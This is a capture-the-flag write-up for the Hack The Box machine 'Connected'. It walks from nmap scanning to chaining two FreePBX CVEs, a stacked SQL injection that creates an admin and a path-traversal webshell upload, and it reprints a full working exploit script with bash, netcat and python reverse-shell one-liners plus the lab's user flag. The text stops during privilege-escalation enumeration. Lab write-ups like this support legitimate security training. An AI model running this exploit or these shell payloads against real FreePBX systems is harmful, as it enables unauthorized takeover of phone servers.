---
tags:
  - SN_11
link: https://app.hackthebox.com/machines/Connected
description: Easy·Linux
image: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/5f828febf436aa997dff714a184614fe.png
solve date: 2026-06-07
solved: true
machine no.: 3
---
<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/HTB Logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">Connected Writeup</p></div>

  <img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/5f828febf436aa997dff714a184614fe.png" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 18px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: nedmoeca</p>
    <p style="margin: 0;">Machine Author(s): PJ131</p>
    <p style="margin: 0;">Difficulty: Easy</p>
    <p style="margin: 0;">Date: 16 June 2026</p>
  </div>

</div>
<!-- PAGE BREAK -->

## Attack Chain Summary


<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 1. Reconnaissance & Discovery
### 1.1 Connect to Hack The Box

First, download your personalized `.ovpn` file from Hack The Box.

Connect to the HTB VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command: `sudo openvpn your_file.ovpn`

You can confirm your VPN tunnel is up before you touch the target.

Command: `ip a | grep tun0`

Start the Machine.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 1.2 Verifying the Target is Reachable

Verify that the target machine is up and reachable by performing an ICMP ping test.

**Command:** `ping -c 4 TARGET_IP`

**Breakdown:**

- `-c 4` → sends 4 packets only (clean output, fast)

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Connected]
└─$ ping -c 4 TARGET_IP          
PING TARGET_IP (TARGET_IP) 56(84) bytes of data.
64 bytes from TARGET_IP: icmp_seq=1 ttl=63 time=247 ms
64 bytes from TARGET_IP: icmp_seq=2 ttl=63 time=213 ms
64 bytes from TARGET_IP: icmp_seq=3 ttl=63 time=212 ms
64 bytes from TARGET_IP: icmp_seq=4 ttl=63 time=213 ms

--- TARGET_IP ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 211.856/221.311/246.876/14.771 ms
```

A successful response confirms that the machine is active and accessible on the HTB network, allowing us to proceed with the enumeration phase.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 2. Enumeration

### 2.1 Port Scan with Nmap

Before we can attack a system, we need to find out what "doors" are open. Doors in this context are ports. We use a tool called **Nmap** (Network Mapper) to scan the target's IP address and see what services are running.

#### 2.1.1 The "Spearfishing" Scan (All Ports, High Speed)

**Command:** `nmap -p- --min-rate 5000 -Pn TARGET_IP`

**Breakdown:**

- **`nmap`**
    - **Description:** The utility itself.
- **`-p-`**
    - **Description:** All Ports Scan. 
    - **Purpose:** Scans all 65,535 ports. Slower but thorough.
- `--min-rate 5000`
	- **Description:** Minimum Packet Rate.
	- **Purpose:** Forces Nmap to send at least 5,000 packets per second. This reduces scan time on stable networks like the HTB VPN.
- `-Pn`
    - **Description:** Skip Host Discovery.
    - **Purpose:** Treats the host as "online" even if it doesn't respond to pings (ICMP). Many HTB boxes have firewalls that block pings.
- **`TARGET_IP`**
    - **Description:** Target Specification.
    - **Purpose:** The IP address of the host being scanned.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Connected]
└─$ nmap -p- --min-rate 5000 -Pn TARGET_IP
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-16 09:58 -0400
Nmap scan report for TARGET_IP
Host is up (0.44s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 29.02 seconds
```
<div align="center">
<br>
<br>
</div>

#### 2.1.2 The "Deep Dive" Scan (Targeted Aggression)

**Command:** `nmap -A -p p1,p2,p3,p4 TARGET_IP`

**Breakdown:**

- **`-A`**
    - **Description:** Aggressive Scan Mode.
    - **Purpose:** Enables OS detection, version detection, script scanning (`-sC`), and traceroute all at once.
- `-p`
    - **Description:** Targeted Port List.
    - **Purpose:** Restricts the heavy scanning to only the ports you confirmed are open, saving significant time and processing power.


**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Connected]
└─$ nmap -A -p 22,80,443 TARGET_IP        
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-16 10:00 -0400
Nmap scan report for TARGET_IP
Host is up (0.22s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_http-title: Did not follow redirect to http://connected.htb/
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
|_ssl-date: TLS randomness does not represent time
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   221.34 ms 10.10.14.1
2   222.89 ms TARGET_IP

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.11 seconds

```
<div align="center">
<br>
<br>
</div>

#### 2.1.3 Scan Results Analysis

| Port | Service | Version                                 | Analysis                                                                                                                                                                                                                                                                                 |
| ---- | ------- | --------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 22   | SSH     | OpenSSH 7.4 (protocol 2.0)              | Standard remote-administration service. Useful later for lateral movement once credentials are obtained, or to confirm a foothold survives.                                                                                                                                              |
| 80   | HTTP    | Apache httpd 2.4.6 (CentOS), PHP 7.4.16 | Hosts the FreePBX web administration interface. The CentOS/Sangoma stack and the `config.php` redirect strongly indicate FreePBX — confirmed later as version 16.0.40.7, which is vulnerable to **CVE-2025-57819** (unauthenticated SQLi → RCE). This becomes the primary attack vector. |
| 443  | HTTPS   | Apache/2.4.6 (CentOS), same PHP stack   | TLS-wrapped copy of the same web application; the certificate CN `pbxconnect` further corroborates the FreePBX/Sangoma identification and gives a hint toward the machine's theme ("Connected").                                                                                         |

<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

### 2.2 Enumeration of Web Services

#### 2.2.1 Update Hosts File

**Command:** `echo "TARGET_IP  connected.htb" | sudo tee -a /etc/hosts`

**Breakdown:**

- `echo "TARGET_IP connected.htb"`
  - **Description:** Prints a hostname-to-IP mapping line in the format `/etc/hosts` expects.
  - **Purpose:** Generates the exact line needed to register the target under a friendly hostname.
- `sudo tee -a /etc/hosts`
  - **Description:** `tee` writes standard input both to the terminal and to a file; `-a` appends rather than overwrites; `sudo` provides the root privilege required to modify a system file.
  - **Purpose:** Appends the new mapping to `/etc/hosts` without clobbering existing entries, which is necessary because root ownership prevents a normal redirect (`>>`) from a non-root shell.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.2.2 Web Enumeration

Browse to `http://connected.htb`.

The root path immediately 302-redirects to `http://connected.htb/admin/config.php`.

![[Pasted image 20260616185544.png]]

Look at the footer of that page:

```
FreePBX is a registered trademark of
Sangoma Technologies Inc.
FreePBX 16.0.40.7 is licensed under the GPL
Copyright© 2007-2026
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.2.3 Vulnerability Research and Analysis

**Search Query:** `FreePBX 16.0.40.7 cves`

![[Google Search - FreePBX 16.0.40.7 cves.png]]

A Google search for `FreePBX 16.0.40.7 cves` immediately surfaces two critical, public vulnerabilities affecting this exact version:

![[freepbx_cve_chain_infographic.png]]
<div align="center">
<br>
<br>
</div>

##### CVE-2025-57819 — The "Lockpick"

Imagine FreePBX has a front door with a lock. Normally you need a username and password to get in. This CVE is a bug that lets you **skip the lock entirely**.

Here's what's happening under the hood:

FreePBX has a page called `/admin/ajax.php` that accepts a parameter called `brand`. The developer expected you to put something harmless there like a device brand name. But the code takes whatever you type and **feeds it directly into a database query without checking it first**.

This is called **SQL Injection** — specifically a "stacked" variant, meaning you can close the original query early with a single quote `'` and then **add your own completely separate SQL command** right after it.

Since no login is required to reach this page, an attacker can send a crafted request that says:

> _"Hey database, while you're at it — also create me a brand new admin account with this username and password."_

The database obeys. No authentication required. You just made yourself an admin from the outside.
<div align="center">
<br>
<br>
</div>

##### CVE-2025-61678 — The "Master Key"

Now you're logged in as that fake admin. This CVE is what you do **with** that access.

FreePBX has a file upload feature in its Endpoint Manager — normally for uploading firmware files for desk phones. But the code doesn't properly check **where** the file actually gets saved.

By manipulating a parameter called `fwbrand`, you can use **path traversal** — basically typing `../../../` to climb out of the intended upload folder and drop your file **anywhere on the server**, including the public web folder.

So the attacker uploads a tiny PHP file — a **webshell** — into a folder the web server serves publicly. Now they can visit that file in a browser and pass commands to the server through it, like:

> `http://connected.htb/randomfolder/shell.php?cmd=whoami`

And the server runs it.

Chained together, these two CVEs form a complete unauthenticated RCE path: `CVE-2025-57819` injects a new admin account into the database, `CVE-2025-61678` leverages that account to drop a PHP webshell, and the webshell delivers a reverse shell.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 3. Exploitation

### 3.1 Exploit Acquisition and Preparation

**Command:** `git clone https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE.git`

![[Pasted image 20260617002656.png]]

**Result:**

```shell
┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Connected]
└─$ git clone https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE.git                
Cloning into 'FreePBX-CVE-2025-57819-RCE'...
remote: Enumerating objects: 10, done.
remote: Counting objects: 100% (10/10), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 10 (delta 2), reused 6 (delta 1), pack-reused 0 (from 0)
Receiving objects: 100% (10/10), 6.45 KiB | 2.15 MiB/s, done.
Resolving deltas: 100% (2/2), done.

┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Connected]
└─$ ls   
FreePBX-CVE-2025-57819-RCE  watchTowr-vs-FreePBX-CVE-2025-57819

┌──(kali㉿kali)-[~/…/HTB/Machines/SN11/Connected]
└─$ cd FreePBX-CVE-2025-57819-RCE 

┌──(kali㉿kali)-[~/…/Machines/SN11/Connected/FreePBX-CVE-2025-57819-RCE]
└─$ ls
exploit.py  README.md
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 3.1.1 `exploit.py`

```shell
┌──(kali㉿kali)-[~/…/Machines/SN11/Connected/FreePBX-CVE-2025-57819-RCE]
└─$ cat exploit.py
```

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
#   FreePBX 16 unauthenticated SQLi -> admin -> authenticated file-upload RCE
#   Chains:
#     CVE-2025-57819  unauth stacked SQL injection (endpoint module loader, 'brand' param)
#     CVE-2025-61678  authenticated arbitrary file upload (endpoint 'upload_cust_fw', fwbrand traversal)
#
#   Flow:
#     1. Inject a brand-new FreePBX admin straight into the `ampusers` table via stacked SQLi (no auth).
#     2. Log into the FreePBX admin panel as that user.
#     3. Abuse the Endpoint Manager firmware uploader to drop a PHP webshell into the web root.
#     4. Run a single command (--command) or pop an interactive reverse shell (--lhost/--lport).
#
import argparse
import hashlib
import random
import string
import sys
import threading
import time

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    sys.exit("[-] pip install requests")

BANNER = r"""
 ██████████ █████                  █████
░░███░░░░░█░░███                  ░░███
 ░███  █ ░  ░███████   █████ █████ ░███████
 ░██████    ░███░░███ ░░███ ░░███  ░███░░███
 ░███░░█    ░███ ░███  ░░░█████░   ░███ ░███
 ░███ ░   █ ░███ ░███   ███░░░███  ░███ ░███
 ██████████ ████ █████ █████ █████ ████████
░░░░░░░░░░ ░░░░ ░░░░░ ░░░░░ ░░░░░ ░░░░░░░░

    FreePBX 16 SQLi -> Admin -> RCE  (CVE-2025-57819 + CVE-2025-61678)
    linkedin: ehxb /// medium.com/@Ehxb /// github 0xEHxb
"""

# ---- pretty logging ------------------------------------------------------
def log(tag, msg, c=""):
    cols = {"+": "\033[92m", "-": "\033[91m", "*": "\033[94m", "!": "\033[93m"}
    r = "\033[0m"
    print(f"{cols.get(tag, '')}[{tag}]{r} {msg}")

def hx(s):
    """encode a python str/bytes as a MySQL 0x... hex literal (quote-free)."""
    if isinstance(s, str):
        s = s.encode()
    return "0x" + s.hex()

def rnd(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


class FreePBXExploit:
    def __init__(self, rhost, rport, ssl=True, timeout=30):
        scheme = "https" if ssl else "http"
        # omit the port when it's the default, otherwise FreePBX's Referer host check
        # (host vs host:port) rejects the upload with "ajaxRequest declined - Referrer"
        if (ssl and rport == 443) or (not ssl and rport == 80):
            self.base = f"{scheme}://{rhost}"
        else:
            self.base = f"{scheme}://{rhost}:{rport}"
        self.host = rhost
        self.timeout = timeout
        self.s = requests.Session()
        self.s.verify = False
        self.s.headers.update({"User-Agent": "Mozilla/5.0"})
        self.user = "svc_" + rnd(5)
        self.password = rnd(12)
        self.shell_dir = rnd(10)
        self.shell_name = rnd(8) + ".php"

    # ---- step 1: CVE-2025-57819 stacked SQLi -> create admin -------------
    def _sqli(self, payload):
        """Send a stacked-query payload through the unauth endpoint loader."""
        params = {
            "module": r"FreePBX\modules\endpoint\ajax",
            "command": "model",
            "template": "x",
            "model": "model",
            "brand": payload,
        }
        return self.s.get(f"{self.base}/admin/ajax.php", params=params, timeout=self.timeout)

    def create_admin(self):
        log("*", f"[CVE-2025-57819] creating admin via stacked SQLi: {self.user}:{self.password}")
        sha1 = hashlib.sha1(self.password.encode()).hexdigest()
        # idempotent: drop any leftover, then insert with full ('*') section access
        self._sqli(f"x'; DELETE FROM asterisk.ampusers WHERE username={hx(self.user)}-- -")
        self._sqli(
            "x'; INSERT INTO asterisk.ampusers (username,password_sha1,sections) "
            f"VALUES ({hx(self.user)},{hx(sha1)},0x2a)-- -"
        )
        log("+", "admin row inserted into ampusers")

    # ---- step 2: authenticate ------------------------------------------
    def login(self):
        log("*", "logging into FreePBX admin panel")
        self.s.get(f"{self.base}/admin/config.php", timeout=self.timeout)
        r = self.s.post(
            f"{self.base}/admin/config.php",
            data={"username": self.user, "password": self.password},
            timeout=self.timeout,
        )
        if "Logout" in r.text or "Dashboard" in r.text or "nav-tabs" in r.text:
            log("+", "authenticated as " + self.user)
            return True
        # fall back: hit the dashboard to confirm a live session
        r = self.s.get(f"{self.base}/admin/config.php", timeout=self.timeout)
        if "Logout" in r.text:
            log("+", "authenticated as " + self.user)
            return True
        log("-", "login failed")
        return False

    # ---- step 3: CVE-2025-61678 file-upload -> webshell -----------------
    def upload_shell(self):
        log("*", f"[CVE-2025-61678] uploading webshell -> /{self.shell_dir}/{self.shell_name}")
        webshell = b'<?php if(isset($_REQUEST["cmd"])){echo "<pre>";system($_REQUEST["cmd"]);echo "</pre>";} ?>'
        files = {
            "dzuuid": (None, "48069f49-c03e-4182-81f7-48e36622e0d3"),
            "dzchunkindex": (None, "0"),
            "dztotalfilesize": (None, str(len(webshell))),
            "dzchunksize": (None, "2000000"),
            "dztotalchunkcount": (None, "1"),
            "dzchunkbyteoffset": (None, "0"),
            # traversal out of /tftpboot/customfw/ into the web root; new dir so mkdir() succeeds
            "fwbrand": (None, f"../../../var/www/html/{self.shell_dir}"),
            "fwmodel": (None, "1"),
            "fwversion": (None, "1"),
            "file": (self.shell_name, webshell, "application/x-php"),
        }
        headers = {
            "Referer": f"{self.base}/admin/config.php?display=epm_advanced",
            "X-Requested-With": "XMLHttpRequest",
        }
        # the handler throws a non-fatal unlink/mkdir warning AFTER writing the file -> ignore status
        self.s.post(
            f"{self.base}/admin/ajax.php?module=endpoint&command=upload_cust_fw",
            files=files, headers=headers, timeout=self.timeout,
        )
        self.shell_url = f"{self.base}/{self.shell_dir}/{self.shell_name}"
        if self.run_cmd("echo EHXB_$((1+1))").strip().endswith("EHXB_2"):
            log("+", f"webshell live: {self.shell_url}")
            return True
        log("-", "webshell not reachable")
        return False

    # ---- step 4a: single command ---------------------------------------
    def run_cmd(self, cmd):
        try:
            r = self.s.get(self.shell_url, params={"cmd": cmd}, timeout=self.timeout)
            return r.text.replace("<pre>", "").replace("</pre>", "")
        except Exception:
            return ""

    # ---- step 4b: interactive reverse shell ----------------------------
    def reverse_shell(self, lhost, lport):
        payloads = [
            f'bash -c "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"',
            f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {lhost} {lport} >/tmp/f',
            f'python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("{lhost}",{lport}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("bash")\'',
        ]
        log("*", f"firing reverse shell -> {lhost}:{lport}")
        for p in payloads:
            threading.Thread(target=self.run_cmd, args=(p,), daemon=True).start()
            time.sleep(0.5)


def main():
    print(BANNER)
    ap = argparse.ArgumentParser(
        description="FreePBX 16 unauth SQLi -> admin -> RCE (CVE-2025-57819 + CVE-2025-61678)")
    ap.add_argument("--rhost", required=True, help="target host (e.g. pbx.example.com)")
    ap.add_argument("--rport", type=int, default=443, help="target port (default 443)")
    ap.add_argument("--http", action="store_true", help="use plain HTTP instead of HTTPS")
    ap.add_argument("--lhost", help="attacker IP for reverse shell")
    ap.add_argument("--lport", type=int, help="attacker port for reverse shell")
    ap.add_argument("--command", help="run a single command instead of a reverse shell")
    args = ap.parse_args()

    x = FreePBXExploit(args.rhost, args.rport, ssl=not args.http)

    x.create_admin()
    if not x.login():
        sys.exit(1)
    if not x.upload_shell():
        sys.exit(1)

    # mode: single command
    if args.command:
        log("*", f"executing: {args.command}")
        print(x.run_cmd(args.command))
        return

    # mode: reverse shell (auto-listener via pwntools if available)
    if args.lhost and args.lport:
        try:
            from pwn import listen
            l = listen(args.lport)
            time.sleep(1)
            x.reverse_shell(args.lhost, args.lport)
            l.wait_for_connection()
            log("+", "shell incoming! dropping to interactive")
            l.interactive()
        except ImportError:
            log("!", "pwntools not found - start your own listener:")
            log("!", f"    nc -lvnp {args.lport}")
            input("[*] press ENTER once your listener is ready...")
            x.reverse_shell(args.lhost, args.lport)
            log("*", "payload sent, check your listener")
        return

    # default: confirm RCE
    log("+", "RCE confirmed as: " + x.run_cmd("id").strip())
    log("!", "use --command '<cmd>' or --lhost/--lport for a shell")


if __name__ == "__main__":
    main()
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 3.2.2 Code Breakdown

![[exploit_flowchart.png]]



<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 3.2.3 Exploit Preparation

Before launching the exploit, start a netcat listener on you attack machine to catch the incoming reverse shell callback:

**Command:** `nc -lvnp 4444`

**Breakdown:**

- `nc`
  - Description: Netcat — a general-purpose TCP/UDP networking utility.
  - Purpose: Provides the listening endpoint that the target's reverse-shell payload will connect back to.
- `-l`
  - Description: Listen mode — waits for an inbound connection rather than initiating one.
  - Purpose: Required to passively receive the callback from the exploited host.
- `-v`
  - Description: Verbose mode — prints connection status messages.
  - Purpose: Confirms exactly when and from where a connection arrives, which is the primary indicator that the exploit succeeded.
- `-n`
  - Description: Skips DNS resolution.
  - Purpose: Speeds up connection handling and avoids unnecessary DNS lookups.
- `-p 4444`
  - Description: Specifies the local TCP port to listen on.
  - Purpose: Must match the --lport value passed to the exploit script so the reverse shell connects to the correct place.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/Machines/SN11/Connected/FreePBX-CVE-2025-57819-RCE]
└─$ nc -lvnp 4444                      
listening on [any] 4444 ...
```

The listener is active and waiting for an inbound connection on port `4444`.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.2 Exploit Execution

Before running the script, note the target's login endpoint has ~220ms RTT due to VPN latency.

==what is this latency thingy?==

Increase the script's default timeout from 30 seconds to 90 seconds.

Before:

```python
    def __init__(self, rhost, rport, ssl=True, timeout=30):
```

After:

```python
    def __init__(self, rhost, rport, ssl=True, timeout=90):
```

Now run the script against the target.

**Command:** `python3 exploit.py --rhost connected.htb --rport 80 --http --lhost 10.10.14.85 --lport 4444`

**Breakdown:**

- `python3 exploit.py`
	- Description: Executes the 0xEhab PoC script with Python 3.
	- Purpose: Runs the chained CVE-2025-57819 + CVE-2025-61678 exploit against the confirmed-vulnerable FreePBX 16.0.40.7 instance.
- `--rhost connected.htb`
	- Description: The target hostname.
	- Purpose: Points the exploit at the FreePBX instance identified during enumeration. The hostname form is used rather than the raw IP because FreePBX's internal routing depends on the Host: header being consistent.
- `--rport 80`
	- Description: The target port.
	- Purpose: Targets the HTTP service confirmed open on port 80 during the Nmap scan.
- `--http`
	- Description: Forces the script to use plain HTTP instead of the default HTTPS.
	- Purpose: The HTTPS service on port 443 returned a 400 Bad Request during enumeration; port 80 served the FreePBX admin interface correctly.
- `--lhost 10.10.14.85`
	- Description: The attacker's listening IP address.
	- Purpose: Embedded into the reverse-shell one-liner so the compromised host knows where to connect back — this is the tun0 VPN address confirmed in section 1.1.
- `--lport 4444`
	- Description: The attacker's listening TCP port.
	- Purpose: Matches the port the nc listener is bound to.

**Result:**

```shell
┌──(kali㉿kali)-[~/…/Machines/SN11/Connected/FreePBX-CVE-2025-57819-RCE]
└─$ python3 exploit.py --rhost connected.htb --rport 80 --http --lhost 10.10.14.85 --lport 4444

 ██████████ █████                  █████
░░███░░░░░█░░███                  ░░███
 ░███  █ ░  ░███████   █████ █████ ░███████
 ░██████    ░███░░███ ░░███ ░░███  ░███░░███
 ░███░░█    ░███ ░███  ░░░█████░   ░███ ░███
 ░███ ░   █ ░███ ░███   ███░░░███  ░███ ░███
 ██████████ ████ █████ █████ █████ ████████
░░░░░░░░░░ ░░░░ ░░░░░ ░░░░░ ░░░░░ ░░░░░░░░

    FreePBX 16 SQLi -> Admin -> RCE  (CVE-2025-57819 + CVE-2025-61678)
    linkedin: ehxb /// medium.com/@Ehxb /// github 0xEHxb

[*] [CVE-2025-57819] creating admin via stacked SQLi: svc_gseug:jx9g6yx9fahm
[+] admin row inserted into ampusers
[*] logging into FreePBX admin panel
[+] authenticated as svc_gseug
[*] [CVE-2025-61678] uploading webshell -> /1o0kbv2rey/98bc7nfu.php
[+] webshell live: http://connected.htb/1o0kbv2rey/98bc7nfu.php
[!] pwntools not found - start your own listener:
[!]     nc -lvnp 4444
[*] press ENTER once your listener is ready...
```

Press Enter

```shell
[*] firing reverse shell -> 10.10.14.85:4444
[*] payload sent, check your listener
```

The exploit completes all three phases successfully: the admin account is injected via SQL injection, authentication succeeded, the webshell is uploaded via path traversal and confirmed live, and the reverse shell payload is fired through it.

Check the listener terminal for the callback:

```shell
┌──(kali㉿kali)-[~/…/Machines/SN11/Connected/FreePBX-CVE-2025-57819-RCE]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.85] from (UNKNOWN) [TARGET_IP] 33588
bash: no job control in this shell
______                   ______ ______ __   __
|  ___|                  | ___ \| ___ \\ \ / /
| |_    _ __   ___   ___ | |_/ /| |_/ / \ V / 
|  _|  | '__| / _ \ / _ \|  __/ | ___ \ /   \ 
| |    | |   |  __/|  __/| |    | |_/ // /^\ \
\_|    |_|    \___| \___|\_|    \____/ \/   \/
                                              
                                              
NOTICE! You have 3 notifications! Please log into the UI to see them!
Current Network Configuration
+-----------+-------------------+---------------------------+
| Interface | MAC Address       | IP Addresses              |
+-----------+-------------------+---------------------------+
| eth0      | A2:DE:AD:9B:7D:94 | TARGET_IP             |
|           |                   | fe80::82bd:1bcb:a990:dd3b |
+-----------+-------------------+---------------------------+

Please note most tasks should be handled through the GUI.
You can access the GUI by typing one of the above IPs in to your web browser.
For support please visit: 
    http://www.freepbx.org/support-and-professional-services

+---------------------------------------------------------------------+
| This machine is not activated.  Activating your system ensures that |
| your machine is eligible for support and that it has the ability to |
| install Commercial Modules.                                         |
|                                                                     |
| If you already have a Deployment ID for this machine, simply run:   |
|                                                                     |
|    fwconsole sysadmin activate deploymentid                         |
|                                                                     |
| to assign that Deployment ID to this system. If this system is new, |
| please go to Activation (which is on the System Admin page in the   |
| Web UI) and create a new Deployment there.                          |
+---------------------------------------------------------------------+

[asterisk@connected 1o0kbv2rey]$ 
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.3 Shell Stabilization

You can stabilize the shell with a command like `python -c 'import pty; pty.spawn("/bin/bash")'` or not. It's a quality of life thing, not a requirement.

Without stabilisation you can still run every command needed to complete the box — enumerate files, read flags, write payloads, trigger privesc. The only things you lose are arrow keys, tab completion, and the ability to run interactive programs like vi or su.

On a box like this where you're not doing anything that requires a true TTY, skipping it is perfectly fine. Most experienced pentesters stabilize out of habit because a broken shell gets annoying fast, but it's never mandatory.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 4. Post-Exploitation

### 4.1 User Flag

Search the file system for the user flag.

**Command:** `find / -name 'user.txt' 2>/dev/null`

**Breakdown:**

- `find /`
	- Description: Recursively searches the entire filesystem starting from the root directory.
	- Purpose: Locates both flags in a single pass regardless of which directory they reside in, avoiding assumptions about their location.
- `-name 'user.txt' -o -name 'root.txt'`
	- Description: Matches files named exactly user.txt or root.txt. -o is a logical OR operator.
	- Purpose: HTB always names flags with these exact filenames, so this pattern reliably finds both without any guessing.
- `2>/dev/null`
	- Description: Redirects standard error to /dev/null, discarding it entirely.
	- Purpose: Suppresses the large volume of Permission denied errors generated while traversing directories the asterisk account cannot read, keeping the output clean.

**Result:**

```shell
[asterisk@connected ~]$ find / -name 'user.txt' 2>/dev/null
find / -name 'user.txt' 2>/dev/null
/home/asterisk/user.txt
[asterisk@connected ~]$ cat /home/asterisk/user.txt
cat /home/asterisk/user.txt
1721c9fe416442c86f52b0b51e8087ba
```

**USER FLAG:** `1721c9fe416442c86f52b0b51e8087ba`
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.2 System Enumeration

With you user flag captured, start enumeration to identify a path to root. The first standard check in sudo privileges:

**Command:** `sudo -l`

**Breakdown:**

- `sudo -l`
  - Description: Lists the commands the current user is permitted to run via sudo.
  - Purpose: The fastest possible privesc check — if any command is configured to run without a password, it is immediately exploitable.

**Result:**

```shell
[asterisk@connected ~]$ sudo -l
sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

sudo: no tty present and no askpass program specified
```

`asterisk` has no passwordless sudo rights and no password is available — this path is a dead end.

Next let's check the processes:

**Command:** `ps aux`


**Breakdown:**

- `ps`
  - Description: Reports a snapshot of current processes.
  - Purpose: Surfaces what services are running as root, what scheduling daemons are active, and any unusual process names that hint at automation or misconfiguration.
- `aux`
  - Description: a shows processes for all users, u uses a user-oriented format showing the owner, and x includes processes without a controlling terminal.
  - Purpose: Ensures no root-owned background processes are missed — daemons without a terminal (the majority of interesting targets) would be invisible without the x flag.

